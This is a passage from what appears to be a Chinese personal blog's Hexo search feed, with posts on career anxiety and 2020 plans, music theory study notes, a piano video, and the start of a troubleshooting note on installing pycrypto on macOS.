    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>迷惘的26岁</title>
    <link href="/posts/74eee304.html"/>
    <url>/posts/74eee304.html</url>
    
    <content type="html"><![CDATA[<h1 id="做到知行合一真的挺难的"><a href="#做到知行合一真的挺难的" class="headerlink" title="做到知行合一真的挺难的"></a>做到知行合一真的挺难的</h1><p>上周看VZOO，老杨说特斯拉股票的时候提到：<strong>想做到知行合一真的挺难的</strong>，我深表认同。老杨看好特斯拉股票后来因为美股的操作难度，没有购买而后悔。我自己也做了一些数字货币的储备，因为短期小幅的涨跌没有坚持自己的看法，做出一些没有必要的交易。当然了，也有自己的职业规划，但面对当前的舒适圈，并没有动力进行。</p><img src="https://pic.gaficat.com/%E7%94%9F%E6%B4%BB%E6%83%B3%E6%B3%95/VZOO%E7%9F%A5%E8%A1%8C%E5%90%88%E4%B8%80.png" alt="知行合一真的挺难的" style="zoom: 25%;" /><h2 id="大多数人对自己的未来没有规划，把自己的命运交给国家"><a href="#大多数人对自己的未来没有规划，把自己的命运交给国家" class="headerlink" title="大多数人对自己的未来没有规划，把自己的命运交给国家"></a>大多数人对自己的未来没有规划，把自己的命运交给国家</h2><p><strong>信息爆炸的时代，对未来没有规划和想法，不保持学习到老的状态，很容易被社会淘汰</strong>。其实我们很多人是对未来没有规划和想法的，可能你有一份稳定的公务员或者国企工作，觉得国家不会不管我。但是之前看读者，有这样一段描述：</p><blockquote><p>国二厂的全称是县国营第二碾米厂，响当当的大厂，进厂就发两套工作服、一双翻毛皮大头皮鞋。逢年过节，整箱整箱的国光苹果、整条整条的大青鱼放在仓库里，等职工搬回家。在我爷爷看来，那些做生意、跑单帮的，不过是暂时钻了政策的空子，国家早晚会回过头来收拾这帮投机倒把的。我爷爷坚信，个体户再有钱，不过是一时风光，国营大厂才是千秋万代的。</p><p>读者. 读者 半月刊 2018年冬季卷合订本（2018.19-24期） (Chinese Edition) (Kindle 位置 219-223). Kindle 版本. </p></blockquote><p>谁想得到几十年后，那些国二厂，国三厂，早就不见了踪影，那你看现在的铁饭碗，像不像当初所谓国几厂？很难预测未来30年，甚至是10年会发生什么改变，也许是一条政策，就导致无数人没了经济来源。</p><h2 id="有想法的人实践起来相当困难"><a href="#有想法的人实践起来相当困难" class="headerlink" title="有想法的人实践起来相当困难"></a>有想法的人实践起来相当困难</h2><p>事实上，现在步入社会的90后，有相当一部分，很有危机意识，对未来有规划、有想法。<strong>但跳出当下或是高收入，或是铁饭碗的舒适圈，对规划想法付诸实践，很难，知行合一真的很难。</strong>我其实就是属于这一部分人，我有一份在当地收入还不错的工作，压力不大，不用加班，有大把的时间做自己喜欢的事。但真让你为将来的规划做一些努力时，总很难静下心或者是迈出那一步。觉得当下的状态真是挺好了，生怕做出的抉择不对，将来的生活可能还不如现在。</p><h2 id="知行合一这件事，社会比学校难多了"><a href="#知行合一这件事，社会比学校难多了" class="headerlink" title="知行合一这件事，社会比学校难多了"></a>知行合一这件事，社会比学校难多了</h2><p>作为一些学生，你知道你能做的，是好好学习，然后或是提升学历，或是尽早为找到一份工作努力。上学那会儿，可能觉得很难，有太多的诱惑了，游戏或是其他的，但是起码你目标是明确的，并且父母，老师、所有人也是支持你那么做的。</p><p>进入社会了，你未来怎么样，只能靠自己规划，没有人管你了。所以，在学校，你有明确的目标，去做就行了，并且有人教你怎么做。而进入社会了，你要先想明白自己的目标是什么，然后结合一切资源，想明白怎么做。最后还要在家庭、父母等等各个方面做权衡，能不能放手做，放手做有什么困难。</p><p><strong>生活怎么这么难。</strong></p><h1 id="已经不是她第一次问我：“你的规划是什么”了"><a href="#已经不是她第一次问我：“你的规划是什么”了" class="headerlink" title="已经不是她第一次问我：“你的规划是什么”了"></a>已经不是她第一次问我：“你的规划是什么”了</h1><p>这篇文章为什么叫迷惘的26岁呢？因为我确实挺迷惘的，自己本身迷惘，加上父母也在给自己压力。但是真正有些击溃我的，是女票反复的询问：“你的规划是什么？我要你给我信心！”以及当前工作给我的不安全感。那么，我的规划是什么？</p><p>我是一名物联网工程（偏向于无线传感器网络）的本科生，却入了网络安全的行业。在一个清、北、中科院硕士博士的团队里打杂。在做的工作实际上，就是外行人看着高大上，内行看着觉得挺简单的工作。我觉得，自己工作了一年半了，除了自己负责的项目，代码量越做越大，能产出一到两篇专利，再没有其他提升了，我看不到自己的未来，晋升或是其他的渠道。我也不是码农，做前端、后端或是安卓、JAVA的，也许码农换个公司一样能继续工作，但我的工作方向太细了，也许辞了当下的这份工作，再去找一份类似的工作，相当艰难。你也许会说，考公务员呗？确实，但公务员现在的起点也很高，大部分也都是硕士起步，我只是本科，要脱产直接去考研吗？考研没考上呢？考完又考公务员，也没考上呢？即使考上，三年的时间成本负担的起吗？所以，我的规划能是什么呢？</p><p>我不知道其他广大男同胞，在女票问你有什么打算的时候是怎么回答的。但是一向对自己未来有想法的我，确实被逼的有些迷惘。我计划着做着当前的工作，尝试弄一些副业，姐夫开的有公司，问过智能家居方面我有没有创业的想法，我也确实做出了一些DEMO，但是你发现真正产品化挺难的。我也想提升自己从小练的钢琴技能，去教琴，但觉得自己本身水平不是非常高，不是科班出身。教琴，也必然会被问及，你是哪里毕业的呀？肯定无言应对。</p><p>我有很长时间没有更新博客了，一方面因为病毒的影响，被困在老家，加上水土不服或是其他的原因，拉了半个月肚子，没有心思做其他事。另一方面，之前稳定更新的学乐理，遇到了瓶颈，我觉得单纯学乐理没有太多用。而折腾NAS，折腾坚果云的webdav等等，都坑巨多。</p><h1 id="已经不知道因为规划是什么而失眠多少次了"><a href="#已经不知道因为规划是什么而失眠多少次了" class="headerlink" title="已经不知道因为规划是什么而失眠多少次了"></a>已经不知道因为规划是什么而失眠多少次了</h1><p>我不知道自己压力为什么这么大，其他人是不是生活的开心。我是一个五线小城市出来的孩子，享受着恶劣的教育条件。我考上了当地最好的高中，但最好的高中也只有百分之三十的一本上线率。我后来大学时到重庆的某所中学教小朋友做机器人，我了解到，他们的一本上线率高达百分之九十。真的是五线小城市的学生们，智力有问题，努力程度不够，造成了这么大的差距吗？我看未必。不是为自己鸣不平，我从五线城市出来，到一个省会，能有一份收入尚可的工作，我看到我已经超越了太多五线城市的同学了。我的这份工作，哪怕是在自己大学（号称小211），和硕士比，也是中上水平的。按理来说，我应该过的相当心安理得，相当无忧无虑，但真不知道自己的焦虑是从哪里不断冒出来的。</p><p>2020我对于自己的未来，规划究竟如何？</p><h2 id="本职工作"><a href="#本职工作" class="headerlink" title="本职工作"></a>本职工作</h2><p>就这一两个月吧，把自己的想法整理成专利，起码让自己有一些竞争力。本来想着多在部门微信公众号之类的发一些文章，但是，一些原因，能出头的工作给了别人了，挺伤的吧。我现在觉得，本本职工作，把自己该做的干了就行了，剩下的经历，多做一些提升自己竞争力的事。</p><h2 id="智能家居"><a href="#智能家居" class="headerlink" title="智能家居"></a>智能家居</h2><p>对于智能家居，我始终是不死心的。我在去年年底，了解到了易微联、涂鸦智能两家2B的供应商，结合自己和原来小伙伴的硬件设计能力，我们能做出自己的产品原型。我希望自己在今年，好好整理一下相关的文档，说明几个问题：</p><ul><li>市场：<ul><li>产品形态：我希望实现易微联官方类似的通断器，在不影响正常墙开使用的前提下，能让灯联网。小米的产品，是需要全屋替换开关的，这就涉及几个问题了，一方面，开关的样式可能和家里装修的风格不一样。另一方面，小米好像只有单开和双开的开关。我希望的产品形态，不影响正常的墙开，给墙开后面接一个东西就行了。</li><li>成本。和当今如日中天的小米比，我们的成本能拉到多低。能给我们本身做产品的公司，带来百分之多少的纯利润。</li></ul></li><li>商业模式。我个人还是认为，装修，智能家居这样的产品，还是应该走VIVO、OPPO卖手机的思路，线下发家。不同于手机一件产品，智能家居这种东西，是一套产品，具体客户的体验、购买、施工，线下是最好的。如果姐夫拉动当地的装修公司，一起推进我们这个事，我觉得，是搞得起来的。</li></ul><p>整理文档的目的，是拉动姐夫投入到这个生意里面来，帮助我实现我的愿望，但是病毒的影响，今年的实体经济，并不是很乐观。</p><h2 id="钢琴"><a href="#钢琴" class="headerlink" title="钢琴"></a>钢琴</h2><p>我从小学就开始学钢琴了，虽然中间有中断，但是发现，所有学琴的小孩子，都是在死磕考级。我不清楚，奖章为什么这么热衷于让孩子考级。不知道真的是考级对孩子能有阶段性的成就感，还是为了满足家长炫耀的虚荣心。考级是走的古典钢琴的路线，钢琴这种乐器本身是孤独的，不像其他乐器小巧，走到哪里都能吹拉弹唱，具有很好的社交属性。古典钢琴就是小孩子一个人在琴房，练着巴赫、肖邦，一遍一遍的重复，那种枯燥，只有练过的人知道。这样本身孤独的乐器，加上孤独的古典，真的让人崩溃。我以为是自己的社交圈子小，后来在大学琴房，认识了其他的小伙伴，发现一个拿过各种奖，可称得上演奏级的学弟，也很孤独。他跟我说，你不用觉得孤独，没人听得懂你，流行是好听啊，大家都喜欢。但是小众的，古典你自己喜欢就行了，没有必要管其他人。我对此不认同，我认为学乐器，本身就是让人有一个爱好，在有压力的时候，能有一个释放的渠道。这个释放的渠道，可以帮助你认识更多人，如果你能在party上弹一首周杰伦、五月天、林俊杰的串烧，如果你能在家庭聚会上，给叔叔婶婶弹一首月亮代表我的心。而不是沉浸在自己的世界里，别人看着，这个真厉害，技术真好，弹得真快，仅此而已。</p><ul><li>乐理：还是听宋大叔的课吧，看李重光的书，听相关的网课，只是教你怎么考试，对理解音乐，没有太大的帮助。看完一遍宋大叔的课，对整体的键盘和声学有了一定的了解后，做一些笔记和整理，这大概需要3个月到半年的时间吧。</li><li>练习：结合乐理的理论知识，进行实践，自己去配和弦，自己做一些即兴的伴奏发挥。</li><li>学历：我是有拿一个艺术学历的想法的，但在职硕士似乎音乐学院很少，远程的授课，针对的是专升本。这一块还没有想好怎么做。</li><li>教学：和妈妈说的朋友联系一下吧，去他的琴行，做做陪练，看看当前琴行教琴的课程。了解一下大众对于流行钢琴的接受程度。了解接受程度很重要，这意味着生源，意味着我希望教流行钢琴，即兴伴奏的想法，是否可行。</li></ul><p>我觉得，钢琴这块，乐理和练习是今年的主旋律，加油吧，即兴伴奏，也是2019年的目标，结果一点进展都没有，今年希望在年底的时候，能信手拈来，坐在琴边，左手和弦一弹，右手就能即兴一些旋律出来。</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>我是个平凡人，我只是个能力一般的平凡人。阶级的跨越相当难，我已经实现从五线小城市到省会城市的跨越了，相当辛酸。焦虑要有，他是你前进的动力，但物极必反，做到问心无愧就好了。</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019的昨天、今天、明天</title>
    <link href="/posts/892a143e.html"/>
    <url>/posts/892a143e.html</url>
    
    <content type="html"><![CDATA[<h1 id="2019的计划"><a href="#2019的计划" class="headerlink" title="2019的计划"></a>2019的计划</h1><p>2020已经过了一个月了，实在是在家里待得太闲了，所以打算整理整理2019的一些事，过年回家之前，冒着赶不上火车的风险，拍了一张2019的计划。</p><img src="https://pic.gaficat.com/maker/2019计划.jpeg" alt="2019计划" style="zoom:40%;" /><p>自己列了6点，实际上呢：</p><ul><li>读书：哈哈，2019摸了一年鱼，没读什么书。</li><li>早起：懒癌泛滥，除了逼自己练琴的时候回早起，给晚上留一些时间。</li><li>交际：和多年不见的基友，看了WE的比赛。最开心的是，脱单啦！并且，女票体贴懂事，这是2019最成功的事啦！</li><li>财务：没存太多钱，带爸妈旅游一波清空，剩了一些黄金和比特币。</li><li>事业：主业上从干劲儿十足，到有些懈劲儿了，也不知道自己的工匠精神在所谓的KPI面前能顶多久。副业上，做了TVOC传感器，打样的5个卖完了，也有人给了一些鼓励和支持，但是靠这个吃饭，肯定不可能。</li><li>琴：除了弹了几首石进的曲子，几千块买了姜创的书，就没进展了。</li></ul><h1 id="2019那些事"><a href="#2019那些事" class="headerlink" title="2019那些事"></a>2019那些事</h1><ul><li>1222：冬至，和冯冯，你懂得。</li><li>1119：公司通知了人才引进政策，子女纳税、子女入学、人才公寓申请有相应的优惠政策。但是要求年薪三十万、硕士博士、留学金陵、创业经历。自己什么都没沾上，挺不开心吧。</li><li>1118：kindle voyage到了，可以继续快乐的看《读者》了。后来其实一直吃灰了，买了乐理书，后来发现mac上看比kindle上看舒服多了。</li><li>1115-1117：跟冯冯度过了一个愉快的周末，做了一些很很胆大的事。</li><li>1105：拿到了体检报告，发现一身的毛病，尿酸偏高、甘油三酯偏高、颈椎骨质增生、腰椎侧弯。</li></ul><p>不幸的是，11月才开始正式维护自己的网站，更多好玩的事情没有记录上，2020加油吧！</p><h1 id="2020的计划"><a href="#2020的计划" class="headerlink" title="2020的计划"></a>2020的计划</h1><p>前几天跟冯冯吵架了，怎么说呢，我们都面临一些压力，冯冯是：“我图这个男生什么呢？”，我是：“你女票比你优秀，你得努力呀？”，我一直是一个忧患意识很强的人，所以活的很悲观，加上亲戚朋友火上浇油，我TM不知道努力吗？你告诉我怎么努力呀？你能保证我做什么事，一定能挣多少钱？这个钱是永远能挣的，不会失业？所以我冲冯冯一通牢骚，一通呛，但是呢，最欣慰的是，冯冯是个很懂事的姑娘，非但没有跟我吵，反而给我台阶下，安慰我，哎呀，你说何德何能，能有这么好的女票嘞？</p><p>2020年初，youtube关注了几个UP主，都是人在美国，对国内的经济形势做了一些分析，个人也觉得国内未来五年不容乐观。春节回家，感受最深的是，原来步行街熙熙攘攘的人群，热热闹闹的服装店，倒闭的差不多了，已经看不到太多卖衣服，卖鞋的店了。反而是各种美术、书法、音乐、补习、幼教培训班，拉上了各种横幅，即使经济再不景气，中国的父母也愿意将大头投入到子女的教育上。</p><p>我的2020计划是什么嘞？</p><ul><li>读书：其实真的挺疲惫的，没有心思读书，还是看看《读者》之类的杂志吧，丰富自己的眼界，毕竟小时候看《读者》很多文章对我塑造三观帮助挺大的。</li><li>早起：还是想坚持，公司搬了地址，要想给晚上腾出更多时间做自己的事，就只能早起，六点半起床？</li><li>财务：持续以税后收入百分之五十左右，买入黄金和比特币。我坚信人民币的通胀是必然，并且在近几年会达到空前的高度，所以我依然会坚持4321的理财原则，实际上，2019年，我在比特币和黄金的投入就在收入的百分之五十以上。与之相随的，是极度节俭的生活，没有买自己喜欢的数码产品，没有买一件新衣服，克制自己的欲望其实挺难受的，但是，没办法，这五年韬光养晦，积累财富，“活着”吧！</li><li>事业：经过了一年半的沉淀，今年我打算将自己的研究成果逐渐转化成专利，并且通过各种微信文章之类的平台发声，提高自己的影响力。很开心的是，google的关键词：<strong>比特币节点识别</strong>，排行第一的文章《比特币节点识别的原理及实现方式》，就是出自我之手。</li><li>梦想：我是想有自己的科技公司的，无论是TVOC传感器还是智能家居。过年前，发现了易微联和涂鸦智能，发现的这些2C的厂商已经把产业链做的这么完整了，今年想联系杜哥，做一些demo出来，然后练习姐夫，不知道能不能通过线下，把这个生意搞起来。</li><li>琴：我其实一直保持的练琴，虽然一个月需要给琴行掏300块钱。不过很开心的是，有一次练琴，有小朋友的家长，敲门问我，你教小孩子弹琴吗？我是有计划把教琴当做一个副业的，我在<a href="https://www.gaficat.com/posts/56b04d6f.html">谈谈我对学钢琴的看法</a>中分析了我对于古典钢琴和即兴的区别，我感兴趣，也想教的是流行和即兴。不过，我目前自己还不会呢，因为一直没有人教呀，音乐本身应该是一件好玩的事。所以2020年，希望自己能好好学习乐理，然后进行一些视唱练耳的训练，总结出一些教程或者方法论，让冯冯成为我的第一个学生吧！</li></ul><h1 id="种草清单"><a href="#种草清单" class="headerlink" title="种草清单"></a>种草清单</h1><p>不管怎样，自己还是有一些欲望的，我想把这些东西列成清单，虽然这两年可能没有钱买，但是作为一种激励吧！激励自己努力工作。</p><ul><li><strong>NAS</strong>：这个一咬牙，已经买了，觉得自己有非常多的照骗、电影、资料，存在非常多不同的设备上，虽然有坚果云之类的很好用，但是大文件还是存不下。</li><li><strong>电单车</strong>：本来是打算通勤用的，但是冬天冷，夏天热，还是公交舒服。</li><li><strong>洗碗机</strong>：有些科技是真的能解放人的双手，解决很多家庭矛盾的，洗碗机就是其中之一。想给爸妈买一个洗碗机，小的就可以，锅虽然还是需要自己刷，但是碗和盘子起码不需要刷了。</li><li><strong>扫地机器人</strong>或者<strong>吸尘器</strong>：家里的房子160，爸妈打扫房子就很累，其实大部分是一些灰，扫地机器人或者吸尘器会很有效吧！</li><li><strong>CLP-685</strong>：想给自己的新家里面买一台琴，雅马哈的电钢琴真的做的很棒！</li></ul><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>下周就要开始在家办公啦，下下周就要正式复工啦，就意味着2020的战斗开始啦，加油吧！！</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加菲猫的乐理学习笔记(番外)——李永乐老师讲十二平均律</title>
    <link href="/posts/e20e9539.html"/>
    <url>/posts/e20e9539.html</url>
    
    <content type="html"><![CDATA[<h1 id="开头先说两句"><a href="#开头先说两句" class="headerlink" title="开头先说两句"></a>开头先说两句</h1><p>我其实一直有一个疑问，声音是物体振动发出的，那么音乐中每个音的音高是固定的，为什么没有人很明确的告诉我，C的音高是多少HZ，D的音高是多少HZ呢？最近几天刷到了李永乐老师关于基本乐理的一期视频，才搞懂一直困扰自己的问题。</p><p>中西方有很多的音律体系，比如毕达哥拉斯的五度相生法、管仲的三分损益法，实质上都是用数学的方式，将声音的频率进行不同的划分。目前我们广泛采用的C、D、E、F、G、A、B，实际上就是由十二平均律分出来的。我们一直以为十二平均律是西方传入的，实际上，十二平均律是我们国家古代的朱载堉创造的。</p><h1 id="十二平均律"><a href="#十二平均律" class="headerlink" title="十二平均律"></a>十二平均律</h1><p>十二平均律要解决什么问题呢？我们知道一个八度内，有：C、D、E、F、G、A、G几个音，我们能否让相邻的两个音之间的比例相等呢？朱载堉解决了这个问题：</p><table><thead><tr><th>c</th><th><SUP>#</SUP>c</th><th>d</th><th><SUP>#</SUP>d</th><th>e</th><th>f</th></tr></thead><tbody><tr><td>f<SUB>0</SUB></td><td>$\sqrt[12]{2}$f<SUB>0</SUB></td><td>$(\sqrt[12]{2})^2$f<SUB>0</SUB></td><td>$(\sqrt[12]{2})^3$f<SUB>0</SUB></td><td>$(\sqrt[12]{2})^4$f<SUB>0</SUB></td><td>$(\sqrt[12]{2})^5$f<SUB>0</SUB></td></tr></tbody></table><table><thead><tr><th><SUP>#</SUP>f</th><th>g</th><th><SUP>#</SUP>g</th><th>a</th><th><SUP>#</SUP>a</th><th>b</th><th>c<sup>1</sup></th></tr></thead><tbody><tr><td>$(\sqrt[12]{2})^6$f<SUB>0</SUB></td><td>$(\sqrt[12]{2})^7$f<SUB>0</SUB></td><td>$(\sqrt[12]{2})^8$f<SUB>0</SUB></td><td>$(\sqrt[12]{2})^9$f<SUB>0</SUB></td><td>$(\sqrt[12]{2})^{10}$f<SUB>0</SUB></td><td>$(\sqrt[12]{2})^{11}$f<SUB>0</SUB></td><td>2f<SUB>0</SUB></td></tr></tbody></table><p>上表中，我们可以发现，相邻的两个半音之间，都相差了$\sqrt[12]{2}$倍，这在之后的移调中，非常有帮助。我们知道，国际规定的<strong>标准音a</strong>的频率是440HZ，那么<strong>中央c的频率c<sup>1</sup>为</strong>：</p><p>$440\times (\sqrt[12]{2})^{3}\approx 523.2511306011974 HZ$</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>我们发现除了标准音以及它升高降低n个八度的音以外，其他音的频率都是无理数，也难怪除标准音以外，没有人提其他因的频率了。附上李永乐老师的原视频，感兴趣的可以看一下，讲的相当详细了。</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;">    <iframe src="//player.bilibili.com/player.html?aid=51711136&cid=90524082&page=1"  scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"></iframe></div>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
      <category>乐理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>乐理</tag>
      
      <tag>音乐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加菲猫的钢琴演奏——《樱之四月》</title>
    <link href="/posts/f84feb0d.html"/>
    <url>/posts/f84feb0d.html</url>
    
    <content type="html"><![CDATA[<h1 id="开头先说两句"><a href="#开头先说两句" class="headerlink" title="开头先说两句"></a>开头先说两句</h1><p>这首曲子是<strong>石进</strong>的<strong>《樱之四月》</strong>，无意间在虾米音乐听到的，还是demo阶段，就花钱扒了谱，还是挺好听的，也挺简单的。</p>        <style>.bbplayer{width: 100%; max-width: 850px; margin: auto}</style>        <div class="bbplayer">        <iframe class="bbplayer" id="mmedia-pNLltMZm" src="//player.bilibili.com/player.html?bvid=BV1TJ411W7m8&page=1&high_quality=1&danmaku=false"            allowfullscreen="no"            scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups"></iframe>        </div>        <script>            document.getElementById("mmedia-pNLltMZm").style.height=document.getElementById("mmedia-pNLltMZm").scrollWidth*0.76+"px";            window.onresize = function(){              document.getElementById("mmedia-pNLltMZm").style.height=document.getElementById("mmedia-pNLltMZm").scrollWidth*0.76+"px";            };        </script>        <p>其他钢琴视频参见<a href="https://www.gaficat.com/tags/%E6%BC%94%E5%A5%8F/">演奏分类</a>~</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
      <category>演奏</category>
      
    </categories>
    
    
    <tags>
      
      <tag>音乐</tag>
      
      <tag>演奏</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加菲猫的乐理学习笔记（八）——五线谱</title>
    <link href="/posts/fa606a56.html"/>
    <url>/posts/fa606a56.html</url>
    
    <content type="html"><![CDATA[<h1 id="记谱法"><a href="#记谱法" class="headerlink" title="记谱法"></a>记谱法</h1><p>记谱法就是用书面的形式，将音乐记录下来的方法。正确掌握记谱法，对创作和表演都有很大的帮助。记谱法非常多，如古琴谱、锣鼓谱等，如今常见的记谱法有简谱和五线谱。</p><ul><li>简谱：对于民乐比较友好，因为民乐是首调乐器为主，首调乐器如果要演奏G调的曲子，就会先把乐器的音高调整到到这个调上，之后按照简谱演奏，相对简单。</li><li>五线谱：对于固定音高的乐器，比如钢琴相对友好。</li></ul><h1 id="认识五线谱"><a href="#认识五线谱" class="headerlink" title="认识五线谱"></a>认识五线谱</h1><p>用来记录音乐的五条等距离的平行线叫五线谱。</p><p>五条线由下而上依次称第一线、第二线、第三线、第四线、第五线。线与线之间的空隙叫做间，间由下而上依次称第一间、第二间、第三间、第四间。</p><p><img src="https://pic.gaficat.com/maker/%E4%BA%94%E7%BA%BF%E8%B0%B1base.png" alt="五线谱"></p><p>每一条线和每一个间都代表一个音的高度。越靠上音越高，越靠下音越底。为了记写更高或更低的音，在五线谱的上方和下方加入与五线谱平行的短横线，叫做加线。由加线形成的间，叫做加间。记于五线谱上方的加线与加间，称为上加线与上加间；记于五线谱下方的加线与加间，称为下加线与下加间。</p><p>上加线与上加间，由下向上计算；下加线与下加间，由上向下计算。</p><p><img src="https://pic.gaficat.com/maker/%E4%BA%94%E7%BA%BF%E8%B0%B1%E5%8A%A0%E7%BA%BF%E5%8A%A0%E9%97%B4.png" alt="五线谱加线加间"></p><p>虽然加线和加间的数目不限，但上加线与下加线在使用中一般不超过五条。过多的加线和加间，对于读和写都会产生不必要的麻烦。</p><p><strong>记谱必须注意的是</strong>：添加的短横线要与五线谱平行、等距。不能在加线或加间标记的音符上方再加短横线，也不能将加的线连成长线。</p><p><img src="https://pic.gaficat.com/maker/%E4%BA%94%E7%BA%BF%E8%B0%B1%E8%AE%B0%E8%B0%B1%E7%A4%BA%E4%BE%8B.png" alt="记谱示例"></p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
      <category>乐理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>乐理</tag>
      
      <tag>音乐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加菲猫的乐理学习笔记（七）——等音</title>
    <link href="/posts/1b7ce566.html"/>
    <url>/posts/1b7ce566.html</url>
    
    <content type="html"><![CDATA[<p>“等音”即音高相同而写法和意义不同的各音。为什么一个音，音高相同，但写法和意义会出现不同？这在之后调式相关的内容中会详细说明，这里只需要记清楚钢琴键盘上各键的等音是什么即可。</p><img src="https://pic.gaficat.com/maker/等音.png" alt="鞥因" style="zoom:50%;" /><p>窍门实际上就是，升号或者降号，都是移动一个半音，而重升、重降需要移动两个半音（即一个全音）。</p><p>这节没什么特别的内容，记住就好，对之后看谱子后，具体弹琴键上哪个音非常有帮助。</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
      <category>乐理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>乐理</tag>
      
      <tag>音乐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加菲猫的乐理学习笔记（六）——半音和全音</title>
    <link href="/posts/5b849aee.html"/>
    <url>/posts/5b849aee.html</url>
    
    <content type="html"><![CDATA[<h1 id="判断两音关系的思路"><a href="#判断两音关系的思路" class="headerlink" title="判断两音关系的思路"></a>判断两音关系的思路</h1><ol><li>自然与变化的判断：自然的就是基本音级相邻；变化的就是基本音级不相邻（同一个基本音级或者相隔一个基本音级构建）</li><li>半音与全音的判断</li></ol><h1 id="什么是半音？"><a href="#什么是半音？" class="headerlink" title="什么是半音？"></a>什么是半音？</h1><p>为了确定乐音体系中各音的绝对准确高度，人们在实践中创造了各种定律法。如十二平均律，五度相生律，纯律等等。约定乐音体系中隔音的高度，采用不同的定律方法，所得音高的结果是不行通的。当今为世界各国所钢钒采用的定律法是十二平均律，但五度相生律、纯律，在我们的生活中仍起着重要的作用。</p><p>将一个纯八度（c<sup>1</sup>-c<sup>2</sup>）进程是个均等的部分——半音，这种定律法就叫“十二平均律”。现在的钢琴就是根据十二平均律定音的。他的特点是所有半音都相等，半音与半音相加等于一个全音。</p><p>说白了，以钢琴键盘为例，相邻的两个琴键，就是半音，中间隔一个琴键的两个琴键就是全音。</p><img src="https://pic.gaficat.com/maker/全音和半音.png" alt="全音和半音" style="zoom:25%;" /><h1 id="自然与变化"><a href="#自然与变化" class="headerlink" title="自然与变化"></a>自然与变化</h1><p><strong>相邻的琴键和相邻的音级不是一个东西</strong>。相邻的琴键仅仅是视觉上，看着两个琴键相邻。相邻的音级指的是C、D、E、F、G、A、G这样的音级。而自然与变化的判断，实际上是指的谱面上或者记写上来判断的。音级相邻就是自然的，音级不相邻就是变化的。</p><blockquote><p>eg：b-c为自然全音，<sup>#</sup>d-e为自然半音，<sup>#</sup>e-<sup>#</sup>f为自然全音。</p><p>b-<sup>#</sup>b为变化半音，e-<sup>bb</sup>g变化半音。</p></blockquote><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>感觉这一节偏向于考试吧，实际业余爱好者了解这个貌似作用不是特别大~</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
      <category>乐理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>乐理</tag>
      
      <tag>音乐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mac安装百度Python SDK的坑</title>
    <link href="/posts/8e6e40dc.html"/>
    <url>/posts/8e6e40dc.html</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>本文记录了<code>macOS Catalina</code>安装baidu Python SDK的坑，主要是安装<code>pycrypto</code>坑太深了，折腾了好久。</p><h1 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h1><p><code>macOS Catalina</code>版本10.15.2</p><h1 id="出问题的关键点"><a href="#出问题的关键点" class="headerlink" title="出问题的关键点"></a>出问题的关键点</h1><p>查看了百度的<a href="https://cloud.baidu.com/doc/CDN/s/tjwvye2cy">文档</a>，说需要先安装依赖——**<code>pycrypto</code>**，就是这个东西其坑无比。上来不管三七二十一，直接pip安装pycrypto，结果一大堆报错，然后直接去google pycrypto mac，安装了什么gmp之类的，结果牛头不对马嘴，问题还是没有解决，最后还是返回去看一大堆报错，报错中如下信息比较重要：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">checking <span class="hljs-keyword">for</span> gcc... gcc<br>    checking whether the C compiler works... no<br>    configure: error: <span class="hljs-keyword">in</span> `/private/tmp/pip-install-rixi56fh/pycrypto<span class="hljs-string">&#x27;:</span><br><span class="hljs-string">    configure: error: C compiler cannot create executables</span><br></code></pre></td></tr></table></figure><p>直觉上觉得是gcc有问题，于是通过<code>brew</code>安装gcc：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">scarleastdeMacBook-Pro:hexo_auto scarleast$ brew install gcc<br>Updating Homebrew...<br>xcrun: error: invalid active developer path (/Library/Developer/CommandLineTools), missing xcrun at: /Library/Developer/CommandLineTools/usr/bin/xcrun<br>Error: The following formula<br>  gcc<br>cannot be installed as binary package and must be built from <span class="hljs-built_in">source</span>.<br>Install the Command Line Tools:<br>  xcode-select --install<br><br></code></pre></td></tr></table></figure><p>真的，看到又出错，真的冒火，索性log里面直接有提示，需要安装xcode，如下安装xcode即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 